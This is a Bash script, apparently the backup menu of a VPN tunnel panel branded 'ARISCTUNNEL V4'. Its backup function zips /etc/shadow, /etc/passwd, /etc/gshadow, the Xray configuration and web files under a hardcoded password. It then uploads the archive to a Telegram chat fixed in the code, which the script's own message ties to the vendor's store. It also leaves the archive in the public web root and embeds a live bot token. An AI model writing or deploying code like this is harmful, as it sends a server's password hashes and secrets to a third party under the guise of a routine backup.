#!/bin/bash
# COLOR VALIDATION
clear
RED='\033[0;31m'
NC='\033[0m'
gray="\e[1;30m"
Blue="\033[0;34m"
green='\033[0;32m'
grenbo="\e[92;1m"
YELL='\033[0;33m'
BG_BLU="\033[44;1m" # BG BIRU
# Getting
domain=$(cat /etc/xray/domain)
MYIP=$(curl -sS ipv4.icanhazip.com)
IP=$(wget -qO- icanhazip.com)
dateToday=$(date +"%Y-%m-%d")
Name=$(cat /usr/bin/user)
# . Liner 
function baris_panjang() {
   echo -e "\033[5;36m ———————————————————————————————————————————————\033[0m"
}

function ARI_Banner() {
baris_panjang
NAMASC="ARISCTUNNEL V4"
function center_text() {
    local text="$1"
    local width=50  # Sesuaikan dengan panjang baris yang diinginkan

    # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
    local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
    local len=${#plain_text}
    local spaces=$(( (width - len) / 2 ))

    # Tampilkan teks dengan warna dan centering yang benar
    printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
}
# Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
formatted_text="\e[36m.::.\033[0;35m $NAMASC \e[36m.::."
# Tampilkan teks yang diformat
center_text "$formatted_text"
baris_panjang
}

function Sc_Credit(){
sleep 1
baris_panjang
function center_text() {
    local text="$1"
    local width=50  # Sesuaikan dengan panjang baris yang diinginkan

    # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
    local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
    local len=${#plain_text}
    local spaces=$(( (width - len) / 2 ))

    # Tampilkan teks dengan warna dan centering yang benar
    printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
}
# Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
formatted_text="\033[0;35m Terimakasih sudah menggunakan- \033[0m"
formatted_text1="\033[0;35m Script Credit By $NAMASC \033[0m"
# Tampilkan teks yang diformat
center_text "$formatted_text"
center_text "$formatted_text1"
baris_panjang
}
clear
botBackup() {
    switch=on
    bottoken=7113550046:AAHnAaNDdndh8R4fbfIELwDH6W1Dwcn4Lx8
    adminid=1962241851
    echo -e "[ ${green}INFO${NC} ] Create password "
	if [[ -z $InputPass ]]; then
	InputPass="Ari123Ok"
	fi
cd /root &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • VPS Data Backup... "
    rm -rf /root/backup &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • Directory Created... "
    mkdir /root/backup &>/dev/null
    echo -e "[ ${green}INFO${NC} ] • VPS Data Backup Start Now... "
    echo -e "[ ${green}INFO${NC} ] • Please Wait , Backup In Process Now... "
	cp /etc/passwd backup/ &>/dev/null
	echo -e "[ ${green}INFO${NC} ] • Backup passwd data..."
	cp /etc/group backup/ &>/dev/null
	echo -e "[ ${green}INFO${NC} ] • Backup group data..."
	cp /etc/shadow backup/ &>/dev/null
	echo -e "[ ${green}INFO${NC} ] • Backup shadow data..."
	cp /etc/gshadow backup/ &>/dev/null
	echo -e "[ ${green}INFO${NC} ] • Backup gshadow data..."
     ###BACKUP PENTING
cp -r /etc/xray backup/xray &>/dev/null
cp -r /var/www/html/ backup/html &>/dev/null
	echo -e "[ ${green}INFO${NC} ] • Backup Bot data..."
cd /root &>/dev/null
zip -rP "$InputPass" "backup.zip" backup >/dev/null 2>&1

    echo -e "[ ${green}INFO${NC} ] • Sending Via Bot... "
    curl -Ss --request POST \
        --url "https://api.telegram.org/bot${bottoken}/sendDocument?chat_id=${adminid}&caption=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0ALINK FILE : https://${domain}:81/backup.zip" \
        --header 'content-type: multipart/form-data' \
        --form document=@"/root/backup.zip" >/root/t1
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\e[44;97;1m         BACKUP SUCCESS           \e[0m"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
    echo -e "[ ${green}INFO${NC} ] • Completed Backup... "
 echo -e "${green}FILE    :${NC} https://${domain}:81/backup.zip"
    rm -rf /root/backup
    mv /root/backup.zip /var/www/html/backup.zip
    rm -f /root/t1
}
    echo -e "${green}SEMUA BACKUP TELAH TERSIMPAN DI TELE @ARI_VPN_STORE${NC}"
    botBackup
    read -n 1 -s -r -p " Press Enter for Back to Manage"
    menu